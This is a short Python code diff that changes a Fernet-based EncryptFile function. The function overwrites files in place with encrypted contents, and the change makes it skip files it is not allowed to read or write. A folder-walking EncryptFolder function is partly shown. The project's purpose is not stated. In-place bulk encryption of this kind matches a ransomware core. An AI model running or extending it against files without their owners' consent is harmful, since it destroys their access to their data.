@@ -3,15 +3,31 @@ from cryptography.fernet import Fernet
 from .clean import Clean
 
 
-def EncryptFile(file_path,fernet):
-    with open(file_path, 'rb') as file:
-       content = file.read()
+def EncryptFile(file_path, fernet):
+    try:
+        with open(file_path, 'rb') as file:
+            content = file.read()
+    except PermissionError:
+        print(f"Skipping protected file (read blocked): {file_path}")
+        return
+    except Exception as e:
+        print(f"Skipping file due to error: {file_path} ({e})")
+        return
 
     encrypted = fernet.encrypt(content)
 
-    with open(file_path, 'wb') as encrypted_file:
-                encrypted_file.write(encrypted)
-    print(f"\n{file_path} has been encrypted\n\n")
+    try:
+        with open(file_path, 'wb') as encrypted_file:
+            encrypted_file.write(encrypted)
+    except PermissionError:
+        print(f"Skipping protected file (write blocked): {file_path}")
+        return
+    except Exception as e:
+        print(f"Skipping file due to error: {file_path} ({e})")
+        return
+
+    print(f"\n{file_path} has been encrypted\n")
+
 
 def EncryptFolder(path,fernet):
      for files in os.listdir(path): 
